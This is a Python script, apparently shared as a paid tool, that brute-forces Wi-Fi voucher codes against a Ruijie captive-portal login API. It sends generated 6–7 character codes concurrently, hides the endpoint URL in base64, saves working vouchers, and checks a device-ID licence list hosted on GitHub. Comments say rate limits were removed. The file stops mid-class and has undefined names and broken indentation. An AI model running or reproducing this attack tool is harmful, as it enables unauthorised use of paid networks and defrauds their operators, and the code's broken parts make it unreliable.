#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import hashlib
import requests
import aiohttp
import asyncio
import random
import string
from datetime import datetime

# ==========================================
# 0. LEON FG - AUTO DEVICE ID AUTH SYSTEM
# ==========================================

# သင်၏ GitHub Raw Link ကို ဤနေရာတွင် အစားထိုးပါ
GITHUB_RAW_URL = "https://raw.githubusercontent.com/tmmt6132-coder/Lin/main/Key.txt"

def get_device_id():
    """ဖုန်း၏ Device ID ကို ထုတ်ယူခြင်း"""
    try:
        import subprocess
        # Android/Termux ID ကို ယူခြင်း
        device_id = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
        if not device_id: raise Exception
    except:
        # Fallback for PC or other environments
        import uuid
        device_id = hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:12]
    return device_id

def check_auth():
    """Device ID ကို GitHub စာရင်းတွင် ရက်စွဲနှင့်တကွ စစ်ဆေးခြင်း"""
    my_id = get_device_id()
    print(f"{w}[*] Your ID: {y}{my_id}{w}")
    print(f"{y}[*] Checking Server Access...{w}")

    try:
        response = requests.get(GITHUB_RAW_URL, timeout=10)
        if response.status_code != 200:
            print(f"{r}[!] Server Error! GitHub Link ကို စစ်ဆေးပါ။")
            return False
        
        lines = response.text.splitlines()

        for line in lines:
            if "," in line:
                db_id, date_part = line.split(",")
                # Device ID တူမတူ စစ်ခြင်း
                if my_id == db_id.strip():
                    try:
                        expiry_date = datetime.strptime(date_part.strip(), "%Y-%m-%d")
                        if datetime.now() < expiry_date:
                            remaining_days = (expiry_date - datetime.now()).days
                            print(f"{g}[✓] ID Verified! Access Granted.{w}")
                            print(f"{g}[*] Expiry: {date_part.strip()} ({remaining_days} days left){w}")
                            time.sleep(2)
                            return True
                        else:
                            print(f"{r}[✗] သင့် ID သည် သက်တမ်းကုန်ဆုံးသွားပါပြီ! ({date_part})")
                            return False
                    except:
                        continue
        
        print(f"{r}[✗] Access Denied! သင့် ID အား ခွင့်ပြုချက်မရသေးပါ။")
        print(f"{y}[!] ကျေးဇူးပြု၍ Admin ကို ID ပေး၍ အသက်သွင်းခိုင်းပါ။{w}")
        return False

    except:
        print(f"{r}[!] Connection Error! အင်တာနက်ဖွင့်ထားရန် လိုအပ်ပါသည်။")
        return False

# ==========================================
# UI & COLORS
# ==========================================

r, g, y, w = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;37m"

def Logo():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"""{r}
    __       _______   ______   __    _
   |  |     |   ____| /  __  \ |  \  | |
   |  |     |  |__    | |  | | |   \ | |
   |  |     |   __|   | |  | | | |\ \| |
   |  |____ |  |____  | |__| | | | \   |
   |_______||_______| \______/ |_|  \__|
    {y}--------------------------------------
    {w}CREATOR : {g}LEON FG
    {w}SYSTEM  : {g}Auto ID Login (Time-Based)
    {y}--------------------------------------{w}""")

# ==========================================
# BRUTE FORCE CORE (SAMPLE LOGIC)
# ==========================================

async def start_tool():
    SUCCESS = 0
IN_RUNNING_ASCII_BIN = []

try:
    ascii_lower_bin6 = open("ascii_lower_bin6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_lower_bin6 = []
try:
    ascii_lower_bin7 = open("ascii_lower_bin7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_lower_bin7 = []
try:
    ascii_upper_bin6 = open("ascii_upper_bin6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_upper_bin6 = []
try:
    ascii_upper_bin7 = open("ascii_upper_bin7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_upper_bin7 = []
try:
    ascii_bin_mix6 = open("ascii_bin_mix6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_bin_mix6 = []
try:
    ascii_bin_mix7 = open("ascii_bin_mix7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_bin_mix7 = []

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
            return session_id
    except Exception as e:
        return previous_session_id

async def login_voucher(session, session_id, voucher, file=None, check=False, debug=False):
    global SUCCESS
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 1
    }
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": f'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.post(post_url, json=data, headers=headers) as req:
            response = await req.text()
    except Exception as Error:
        return
    if 'logonUrl' in response:
        SUCCESS += 1
        print(f'{g}Success: {voucher}{w}')
        write_file(file="success.txt", data=voucher)
    elif 'expired' in response:
        if not check:
            print(f'{y}Expired: {voucher}{w}')
        write_file(file, voucher)
    elif 'failed' in response:
        if debug:
            print(f'{r}Failed: {voucher}{w}')
        write_file(file, voucher)
    elif 'STA' in response:
        if not check:
            print(f'{b}Limited: {voucher}{w}')
        write_file(file, voucher)

def write_file(file, data):
    with open(file, "a") as f:
        f.write(data+"\n")

def ascii_generator(mode, length):
    if mode == "ascii-lower":
        voucher = "".join(random.choice(string.ascii_lowercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_lower_bin6 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_lower_bin7 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
    elif mode == "ascii-upper":
        voucher = "".join(random.choice(string.ascii_uppercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_upper_bin6 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_upper_bin7 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
    elif mode == "ascii-mix":
        voucher = "".join(random.choice(string.ascii_uppercase+string.ascii_lowercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_bin_mix6 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_bin_mix7 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)

def digit_generator(length):
    vouchers = []
    range_ = 1000000 if length == 6 else 10000000
    for i in range(0, range_):
        vouchers.append(str(i).zfill(length))
    return vouchers

# ==========================================
# LIMIT REMOVED - အကုန်လုံးကို ဖြုတ်ထား
# ==========================================

class VoucherCode:
    def __init__(self, is_free_user=None, mode=None, length=None, speed=None, tasks=None, debug=True):
        self.is_free_user = is_free_user
        self.mode = mode
        self.length = length
        self.speed = speed
        self.tasks = tasks
        self.debug = debug
        # LIMIT REMOVED - အောက်ပါစစ်ဆေးချက်ကို ဖယ်ရှားထား
        # if not self.is_free_user:
        #     if is_reached_limit(True):
        #         print(f"{y}[!] You are reached limit")
        #         sys.exit(0)
        
        if self.mode == "digit":
            if self.length == 6:
                self.file = "failed.txt"
            elif self.length == 7:
                self.file = "failed7.txt"
        elif self.mode == "ascii-lower":
            if self.length == 6:
                self.file = "ascii_lower_bin6.txt"
            elif self.length == 7:
                self.file = "ascii_lower_bin7.txt"
        elif self.mode == "ascii-upper":
            if self.length == 6:
                self.file = "ascii_upper_bin6.txt"
            elif self.length == 7:
                self.file = "ascii_upper_bin7.txt"
        elif self.mode == "ascii-mix":
            if self.length == 6:
                self.file = "ascii_bin_mix6.txt"
            elif self.length == 7:
                self.file = "ascii_bin_mix7.txt"
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Session url not found. Please run setup first.{w}")
            print(f"{y}[!] Run: python voucher.py --setup{w}")
            sys.exit()
    
    def remove_already_checked(self, vouchers):
        try:
            self.fail_code = set(open(self.file, "r").read().splitlines())
        except FileNotFoundError:
            self.fail_code = set()
        try:
            success_code = set(open("success.txt", "r").read().splitlines())
        except FileNotFoundError:
            success_code = set()
        self.removed = list(set(vouchers) - set(self.fail_code) - set(success_code))
        return list(self.removed), list(success_code), list(self.fail_code)

    async def execute_ascii(self):
        global IN_RUNNING_ASCII_BIN
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        if self.mode == "ascii-lower" and self.length == 6:
            checked = str(len(ascii_lower_bin6))
        elif self.mode == "ascii-lower" and self.length == 7:
            checked = str(len(ascii_lower_bin7))
        elif self.mode == "ascii-upper" and self.length == 6:
            checked = str(len(ascii_upper_bin6))
        elif self.mode == "ascii-upper" and self.length == 7:
            checked = str(len(ascii_upper_bin7))
        elif self.mode == "ascii-mix" and self.length == 6:
            checked = str(len(ascii_bin_mix6))
        elif self.mode == "ascii-mix" and self.length == 7:
            checked = str(len(ascii_bin_mix7))
        Logo()
        print(f"[+] Generated voucher codes (unlimited)")
        print(f"[+] Already checked codes ({checked})")
        print(f"[+] success vouchers and failed vouchers are saved in local")
        Line()
        print(f"[+] Bruteforce mode {self.mode}")
        print(f"[+] Voucher code length {str(self.length)}")
        print(f"[+] Bruteforce speed {str(self.speed)}")
        print(f"[+] Bruteforce tasks {str(self.tasks)}")
        print(f"[+] Show debug message {str(self.debug)}")
        Line()
        print(f"{g}[+] Voucher code bruteforce process is running...")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                loop = 0
                while True:
                    voucher = ascii_generator(self.mode, self.length)
                    # LIMIT REMOVED - success limit စစ်ဆေးချက်ကို ဖယ်ရှားထား
                    # if not self.is_free_user:
                    #     if SUCCESS >= 3:
                    #         is_reached_limit(False)
                    #         print(f"{y}[!] You are reached limit")
                    #         break
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    IN_RUNNING_ASCII_BIN.append(voucher)
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Process is finished")
        sys.exit(0)

    async def execute_digit(self):
        generated_code = digit_generator(length=self.length)
        vouchers_code, success_code, fail_code = self.remove_already_checked(generated_code)
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        Logo()
        print(f"[+] Generated voucher codes ({len(generated_code)})")
        print(f"[+] Already checked codes ({len(generated_code)-len(vouchers_code)})")
        print(f"[+] Still remain to check codes ({len(vouchers_code)})")
        print(f"[+] success vouchers and failed vouchers are saved in local")
        Line()
        print(f"[+] Bruteforce mode {self.mode}")
        print(f"[+] Voucher code length {str(self.length)}")
        print(f"[+] Bruteforce speed {str(self.speed)}")
        print(f"[+] Bruteforce tasks {str(self.tasks)}")
        print(f"[+] Show debug message {str(self.debug)}")
        Line()
        print(f"{g}[+] Voucher code bruteforce process is running...")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for loop, voucher in enumerate(vouchers_code, start=0):
                    # LIMIT REMOVED - success limit စစ်ဆေးချက်ကို ဖယ်ရှားထား
                    # if not self.is_free_user:
                    #     if SUCCESS >= 3:
                    #         is_reached_limit(False)
                    #         print(f"{y}[!] You are reached limit")
                    #         break
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Process is finished")
        sys.exit(0)

class RecheckVoucher:
    def __init__(self):
        self.file = "failed.txt" or "failed7.txt"
        try:
            self.success_code = open("success.txt", "r").read().splitlines()
        except Exception as err:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        if len(self.success_code) == 0:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        try:
